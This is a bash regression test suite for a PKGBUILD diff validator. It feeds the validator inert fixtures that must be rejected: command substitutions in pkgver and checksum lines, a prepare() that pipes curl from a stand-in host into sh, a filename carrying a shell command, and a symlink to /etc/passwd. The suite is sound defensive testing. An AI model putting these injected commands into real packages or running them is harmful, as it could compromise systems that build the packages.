#!/usr/bin/env bash
# Adversarial regression tests for scripts/validate-aur-diff.py.
#
# These encode the two vulnerabilities found in the 2026-09-08 security review
# so they cannot silently return:
#
#   - a PKGBUILD assignment that looks routine by prefix but executes code,
#     which the old prefix-stripping filter reported as "nothing but routine
#     version/checksum lines";
#   - a vendored filename carrying shell metacharacters, which the workflow
#     used to interpolate into `run:` script source.
#
# Every payload is inert: the worst any fixture does is name a file oddly or
# write the literal text of a command into a PKGBUILD that is never executed.
# Nothing here runs makepkg, contacts the AUR, or touches the real repository.
#
# Usage: scripts/test-aur-validator.sh

set -euo pipefail

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
VALIDATOR="$REPO_ROOT/scripts/validate-aur-diff.py"

pass=0
fail=0

# A minimal but realistic vendored package, used as the base of every fixture.
BASE_PKGBUILD='pkgname=demo-bin
pkgver=1.0.0
pkgrel=1
arch=("x86_64")
url="https://example.invalid/demo"
source=("https://downloads.claude.ai/demo-${pkgver}.tar.gz")
sha256sums=("0000000000000000000000000000000000000000000000000000000000000000")

package() {
  install -Dm755 demo "$pkgdir/usr/bin/demo"
}'

BASE_MANIFEST='demo-bin	1111111111111111111111111111111111111111	2026-01-01'

# new_fixture <dir> [base-mutator] -- a git repo with the base package
# committed. The optional mutator runs before the commit, so a test can start
# from a package whose committed state already differs.
new_fixture() {
  local d="$1" base_mutate="${2:-}"
  mkdir -p "$d/aur/demo-bin"
  git -C "$d" init -q
  git -C "$d" config user.email t@example.invalid
  git -C "$d" config user.name test
  printf '%s\n' "$BASE_PKGBUILD" > "$d/aur/demo-bin/PKGBUILD"
  printf '%s\n' "$BASE_MANIFEST" > "$d/aur/manifest.tsv"
  [[ -n "$base_mutate" ]] && "$base_mutate" "$d"
  git -C "$d" add -A
  git -C "$d" commit -qm base
}

# expect <PASS|FAIL> <name> <mutator> [base-mutator]
expect() {
  local want="$1" name="$2" mutate="$3" base_mutate="${4:-}"
  local d
  d="$(mktemp -d)"
  new_fixture "$d" "$base_mutate"
  "$mutate" "$d"
  git -C "$d" add -A aur/

  local got out
  if out="$(python3 "$VALIDATOR" --repo "$d" 2>&1)"; then got=PASS; else got=FAIL; fi

  if [[ "$got" == "$want" ]]; then
    printf '  ok   %-52s %s\n' "$name" "$got"
    pass=$((pass + 1))
  else
    printf '  FAIL %-52s want %s got %s\n' "$name" "$want" "$got"
    printf '%s\n' "$out" | sed 's/^/       | /'
    fail=$((fail + 1))
  fi
  rm -rf "$d"
}

# --- the shapes a routine bump legitimately takes -------------------------

m_ordinary_bump() {
  sed -i 's/^pkgver=1.0.0$/pkgver=1.0.1/' "$1/aur/demo-bin/PKGBUILD"
  sed -i 's/0000000000000000000000000000000000000000000000000000000000000000/1111111111111111111111111111111111111111111111111111111111111111/' "$1/aur/demo-bin/PKGBUILD"
  printf 'demo-bin\t2222222222222222222222222222222222222222\t2026-02-02\n' > "$1/aur/manifest.tsv"
}

m_pkgrel_only() { sed -i 's/^pkgrel=1$/pkgrel=2/' "$1/aur/demo-bin/PKGBUILD"; }

# Starts from a package whose committed checksum is SKIP, so the diff really is
# SKIP -> real checksum rather than a change of quoting style.
b_checksum_is_skip() {
  sed -i 's|^sha256sums=.*|sha256sums=("SKIP")|' "$1/aur/demo-bin/PKGBUILD"
}

m_skip_to_real_checksum() {
  sed -i "s/^sha256sums=.*/sha256sums=('3333333333333333333333333333333333333333333333333333333333333333')/" "$1/aur/demo-bin/PKGBUILD"
}

# --- finding 2: executable syntax hiding on a routine-looking line --------

m_command_substitution() {
  sed -i 's/^pkgver=1.0.0$/pkgver=1.0.1$(touch .\/MARKER)/' "$1/aur/demo-bin/PKGBUILD"
}

m_backtick_substitution() {
  sed -i 's|^pkgver=1.0.0$|pkgver=1.0.1`touch ./MARKER`|' "$1/aur/demo-bin/PKGBUILD"
}

m_appended_command() {
  sed -i 's|^pkgver=1.0.0$|pkgver=1.0.1; touch ./MARKER|' "$1/aur/demo-bin/PKGBUILD"
}

m_checksum_line_with_command() {
  sed -i "s|^sha256sums=.*|sha256sums=(\$(touch ./MARKER))|" "$1/aur/demo-bin/PKGBUILD"
}

m_checksum_downgraded_to_skip() {
  sed -i "s|^sha256sums=.*|sha256sums=('SKIP')|" "$1/aur/demo-bin/PKGBUILD"
}

m_new_build_function() {
  printf '\nprepare() {\n  curl -s https://example.invalid/x | sh\n}\n' >> "$1/aur/demo-bin/PKGBUILD"
}

m_source_url_changed() {
  sed -i 's|downloads.claude.ai|evil.example.invalid|' "$1/aur/demo-bin/PKGBUILD"
}

m_manifest_malformed() {
  printf 'demo-bin\tnot-a-commit\t2026-02-02\n' > "$1/aur/manifest.tsv"
}

# --- finding 1: hostile paths, modes and file types -----------------------

m_filename_command_substitution() {
  # The payload lives in the *name*. If any consumer interpolates this into
  # shell, MARKER appears; the validator must reject it as a path.
  printf 'x\n' > "$1/aur/demo-bin/\$(touch MARKER).sh"
}

m_added_install_scriptlet() {
  printf 'post_install() { :; }\n' > "$1/aur/demo-bin/demo.install"
}

m_pkgbuild_made_executable() {
  chmod +x "$1/aur/demo-bin/PKGBUILD"
}

m_pkgbuild_replaced_by_symlink() {
  rm "$1/aur/demo-bin/PKGBUILD"
  ln -s /etc/passwd "$1/aur/demo-bin/PKGBUILD"
}

m_package_deleted() { rm "$1/aur/demo-bin/PKGBUILD"; }

echo "validate-aur-diff.py"
echo
echo "  routine bumps that must validate:"
expect PASS "ordinary version + checksum + manifest bump" m_ordinary_bump
expect PASS "pkgrel-only rebuild"                         m_pkgrel_only
expect PASS "SKIP replaced by a real checksum"            m_skip_to_real_checksum b_checksum_is_skip
echo
echo "  finding 2 -- executable syntax on routine-looking lines:"
expect FAIL "pkgver with command substitution"            m_command_substitution
expect FAIL "pkgver with backtick substitution"           m_backtick_substitution
expect FAIL "pkgver with appended command"                m_appended_command
expect FAIL "checksum array containing a command"         m_checksum_line_with_command
expect FAIL "checksum downgraded to SKIP"                 m_checksum_downgraded_to_skip
expect FAIL "new prepare() piping curl to sh"             m_new_build_function
expect FAIL "source URL host changed"                     m_source_url_changed
expect FAIL "manifest row not a commit hash"              m_manifest_malformed
echo
echo "  finding 1 -- hostile paths, modes and file types:"
expect FAIL "filename containing command substitution"    m_filename_command_substitution
expect FAIL "added .install scriptlet"                    m_added_install_scriptlet
expect FAIL "PKGBUILD made executable"                    m_pkgbuild_made_executable
expect FAIL "PKGBUILD replaced by a symlink"              m_pkgbuild_replaced_by_symlink
expect FAIL "vendored package deleted"                    m_package_deleted
echo
printf '%d passed, %d failed\n' "$pass" "$fail"
[[ $fail -eq 0 ]]
